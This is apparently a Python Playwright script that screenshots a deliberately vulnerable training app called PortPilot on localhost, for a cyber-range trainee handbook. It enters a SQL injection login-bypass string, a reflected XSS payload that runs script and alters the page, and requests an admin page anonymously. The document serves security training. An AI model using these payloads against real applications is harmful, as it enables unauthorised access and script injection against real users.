"""Capture screenshots of the PortPilot vulnerable application.

These screenshots embed into the Scenario 01 trainee handbook to show
the candidate what the target application actually looks like when each
finding is exploited.
"""

import os
from playwright.sync_api import sync_playwright

OUT = "/home/mike/cyberfort/cyber-range-scenarios/01-portpilot-maritime/docs/screenshots/app"
HOST = "http://localhost:8080"


def shot(page, name, full=False):
    path = f"{OUT}/{name}.png"
    page.screenshot(path=path, full_page=full)
    print(f"  📸 {name}.png")


def main():
    os.makedirs(OUT, exist_ok=True)

    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        ctx = browser.new_context(viewport={"width": 1100, "height": 700},
                                  ignore_https_errors=True)

        # --- Step 0 — login page ---
        print("[step 0] login page")
        page = ctx.new_page()
        page.goto(f"{HOST}/login", wait_until="domcontentloaded")
        page.wait_for_timeout(600)
        shot(page, "portpilot-01-login-page")

        # --- Step 3a — SQLi: fill payload into the form, then submit ---
        print("[step 3a] SQLi payload")
        page.fill('input[name="username"]', "admin' OR '1'='1' -- ")
        page.fill('input[name="password"]', "anything")
        page.wait_for_timeout(300)
        shot(page, "portpilot-02-sqli-payload-entered")

        # Submit
        page.click('button[type="submit"]')
        page.wait_for_load_state("networkidle", timeout=10000)
        page.wait_for_timeout(600)
        shot(page, "portpilot-03-dashboard-after-sqli")

        # --- Step 3b — XSS ---
        print("[step 3b] XSS reflection")
        # Set up dialog capture. We capture the message AND auto-accept
        # so the navigation completes and we can screenshot the page.
        dialog_msg = {"text": None}

        def on_dialog(dlg):
            dialog_msg["text"] = dlg.message
            print(f"  🛎  dialog fired: {dlg.message}")
            dlg.accept()

        page.on("dialog", on_dialog)
        # A payload that triggers an alert AND visibly mutates the DOM
        # so the screenshot tells the story.
        payload = (
            '<img src=x onerror="'
            "alert(\\\"XSS executed\\\");"
            "document.body.insertAdjacentHTML(\\\"afterbegin\\\","
            "\\\"<div style=position:fixed;top:14px;left:50%;transform:translateX(-50%);"
            "background:#ffe0e0;color:#8b0000;border:2px solid #b32d2d;padding:10px 18px;"
            "border-radius:6px;z-index:9999;font-weight:bold;font-size:16px>"
            "✓ XSS payload executed — JavaScript injected via /vessels?q=</div>\\\");"
            '">'
        )
        from urllib.parse import quote
        page.goto(f"{HOST}/vessels?q={quote(payload)}",
                  wait_until="domcontentloaded", timeout=10000)
        page.wait_for_timeout(900)
        shot(page, "portpilot-04-xss-executed")

        # --- Step 3c — broken access in fresh incognito context (no cookie) ---
        print("[step 3c] /admin/manifests anonymously")
        anon_ctx = browser.new_context(viewport={"width": 1100, "height": 800},
                                       ignore_https_errors=True)
        anon = anon_ctx.new_page()
        anon.goto(f"{HOST}/admin/manifests", wait_until="domcontentloaded")
        anon.wait_for_timeout(600)
        shot(anon, "portpilot-05-admin-manifests-leak", full=True)
        anon_ctx.close()

        browser.close()
        print("\n✅ portpilot app screenshots captured")


if __name__ == "__main__":
    main()
